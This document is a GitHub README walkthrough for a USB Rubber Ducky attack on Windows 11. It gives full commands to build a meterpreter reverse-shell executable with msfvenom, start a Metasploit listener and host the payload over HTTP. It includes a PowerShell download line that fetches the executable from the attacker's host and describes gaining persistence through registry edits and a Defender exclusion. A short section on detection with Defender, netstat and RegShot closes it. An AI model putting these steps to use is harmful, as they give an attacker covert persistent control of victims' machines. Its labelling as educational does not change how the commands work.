# Windows 11 Ducky PWN

## *** Educational Purposes Only ***

## Description 
For this project I utilized a USB Rubber Ducky from Hak5 and the Kali Linux tools 'msfvenom', 'msfconsole', and 'meterpreter'. Through these tools I deployed a reverse shell, esatblished persistence, 
and cleaned up my suspicous activity. For my attacking machine I used Kali Linux and my victim machine Windows 11 (with all default security enabled). This attack is able to bypass all Windows 11 default security 
features and maintain undetected persetence through the use of modifying the Default User's Windows Registers.

## Video Demo
[![Watch the Demo](https://i9.ytimg.com/vi/uH7h9ziv1Kg/mq1.jpg?sqp=CPj-h8AG-oaymwEmCMACELQB8quKqQMa8AEB-AHUBoAC4AOKAgwIABABGD4gVChlMA8=&rs=AOn4CLBKcuQagU35TL-V5jBWEWH2MJolEA)](https://youtu.be/uH7h9ziv1Kg)

## Walkthrough

### Requirements
- Windows 11 machine or virtual machine
- Kali Linux machine or virtual machine
- USB Rubber Ducky (any version)
- Interent Connection
- NAT Network if using VM's (Need communication between VMS)
  
### Preparing Kali Machine
#### Generate Malicous Executeable (Reverse Shell)
- Use 'msfvenom' to generate our malicous executable
<pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe > /home/x/Desktop/nice3.exe</pre>
- LHOST is the IP adderess of our attacking machine that will act as the server to connect back to replace x.x.x.x with you machines IP
- For /home/x/Desktop/nice3.exe replace x with your Kali Linux username eg /home/Meeps-Underflow/Desktop/nice3.exe
- nice3.exe is the name of our reverse shell executable

![image](https://github.com/user-attachments/assets/98c5b8c5-ab47-45e5-9e0e-c21d1d759ca2)

#### Set Up Listener 
- Open Terminal and use 'msfconsole' to start a Metasploit CLI
<pre>msfconsole</pre>
- Start a exploit multi handler
<pre>use exploit/multi/handler</pre>
- Pass parameters to our listener
- Replace LHOST x.x.x.x with the same IP you used to genrate the payload eg your Kali Machine IP
<pre>set payload windows/meterpreter/reverse_tcp
set LHOST x.x.x.x
set LPORT 4444
set ExitOnSession false</pre>
- Start our listener 
<pre>exploit -j</pre>

![image](https://github.com/user-attachments/assets/61c9f16f-d1d8-4629-9d16-55a5eeaef2d5)

#### Set Up HTTP Server 
- On another Terminal we will host a HTTP server on our Kali Machine containing nice3.exe to be downlaoded
- We will use python3 to create this server on port 80
- Make sure to 'cd' into the directory containing nice3.exe, for me it will be in Desktop
<pre>cd Desktop/</pre>
- Start HTTP server
<pre>python3 -m http.server 80</pre>

![image](https://github.com/user-attachments/assets/6106ade6-483d-4833-9248-fda99cec063c)

### Preparing USB Rubber Ducky
#### Download Repository 
<pre>git clone https://github.com/Meeps-Underflow/Win11_Ducky_PWN.git</pre>
- Verify download should see all contents of my repository on your machine eg win11_ducky_pwn.txt

![image](https://github.com/user-attachments/assets/41f03a31-1c7d-4f81-bc8d-e35bf957e0db)

#### Convert Ducky to Payload
- Visit [Hak5 Payload Studio](https://payloadstudio.hak5.org/community/) follow the introduction and when prompted choose USB Rubber Ducky as your device
- Click File -> Open/Import -> Upload File -> Locate your win11_ducky_pwn.txt file -> Upload
- Take a moment to read over code to undersatnd what is happening
- Change line 63 x.x.x.x to HTTP server's IP
<pre>STRING powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://x.x.x.x/nice3.exe', 'C:\Users\Default\AppData\Roaming\Microsoft\Windows\nice3.exe')"
</pre>
- Click Generate Payload
- Click Download ** Don't change name of inject.bin **

#### Load Payload Into USB Rubber Ducky
- Plug in your USB Rubber Ducky make sure it is not in attack mode
- Open 'Ducky'
- Move inject.bin from 'Downloads' into 'Ducky'

![image](https://github.com/user-attachments/assets/12900457-30d7-4937-8dda-d408e6bd3e3a)
- Safely unmount 'Ducky'

### Attack

#### Boot Up Windows 11
- Start up your fresh Windows 11 Machine
- Ensure all default security features in 'Windows Security' are enabled

![image](https://github.com/user-attachments/assets/24ca4ef9-af40-4bb9-89f8-75cdd84c8e42)

#### Deploying the Duck
- Now that yor Windows Machine is up and running and you have confirmed all the secuirty features you wish to confirm its time to deploy the duck
- Plug in your USB Rubber Ducky into your Windows 11 Machine and sit back and watch
- After execution is complete go back to your Kali Machine and go to the Terminal that has the msf6 session
- You should see that we now have a successful reverse TCP connection with our victim

![image](https://github.com/user-attachments/assets/34d67397-1a26-46dd-8a3f-12d755640302)

- In order to interact with the session run
<pre>sessions -i n</pre>
- Where n is the session id 
- Start a windows shell 
<pre>shell</pre>
- Run a simple windows cmd command to confirm exepected output 'ipconfig'

![image](https://github.com/user-attachments/assets/d32db17a-d28e-4af9-839e-c3fa07cfb151)

- Now that we clearly have a reverse shell that is working on the victims machine it is up to you the attacker to do whatever you wish escalate privledges,snoop files, encrypt files, mine crypto...
- You can do this within a meterpreter shell or a windows shell
- After confirming reverse shell we can terminate our http server by going back to the Terminal and inputing Ctrl + c

#### Test Persestence 
- In order to test persestence we will restart our windows VM and see if our listener on our Kali Machine will get another session when the Windows Machine Boots Back up

![image](https://github.com/user-attachments/assets/f0bddd65-b922-48e1-8ba7-0ecc4f7a7fa3)

- After the machine restarts go back to our msf6 session and wait for a new session to appear

![image](https://github.com/user-attachments/assets/8a118ee2-7306-491e-8171-d7c86d8c8cd9)

- As you can see a new session was created from the machine we previously exploited verifying that our persestence works
- As long as thr Malware remains undetected we will always have a backdoor into the machine so longa s our listener is running and the victim in connected to the internet

### Detection
- Lets now test to see if Microsoft Defender quick scan can detect our malware

#### Quick Scan 1
- First we will run quick scan 

![image](https://github.com/user-attachments/assets/bc4072f0-1f59-4356-83ff-1b6171eb1114)

- As you can see nothing was found but it rasied an exception saying how we are excluding the C drive from scans

![image](https://github.com/user-attachments/assets/cc789579-199e-48be-ba83-c845ec55c1e0)


#### Quick Scan 2
- Remove C Drive Exculsion
- Restart VM or Run quick Scan again both should catch and remove Malware
![image](https://github.com/user-attachments/assets/45e13e3c-cc52-4c08-acd1-03d00d039de9)

- As seen above after removing the exclusion on the C drive the Malware was detected
- Taking action will remove the Malware and terminate our current session
- Looking back at our meterpreter shell we will see the sessions has been killed as well as persistence

![image](https://github.com/user-attachments/assets/729b0b34-703e-4fa8-99e1-bdb1865dc498)

#### Netstat 
- Assume we didnt remove our exclusion and the Malware was actively running with a TCP connection
- Netstat checks for unusual or unauthorized network connections.
<pre>netstat -ano</pre>
![image](https://github.com/user-attachments/assets/da31277d-17cd-4ce7-bd19-07d24a676753)
- As seen above we can find a suspicous TCP connection with an unknown ip adderess and a suspicous port with the associate PID

#### RegShot
- We can use regshot to take a snapshot of our registries before the malware was executed and then another after to compare with and see any differneces

![image](https://github.com/user-attachments/assets/25774496-b56c-40bf-84da-725e742476d3)
- It takes a bit of reading but eventually you will come across the suspicous registry edit where now we can manually remove the malware and fix our registry


## Disclaimer

This project is intended for educational purposes only. Do not use these techniques on systems you do not own or have explicit permission to test.



  






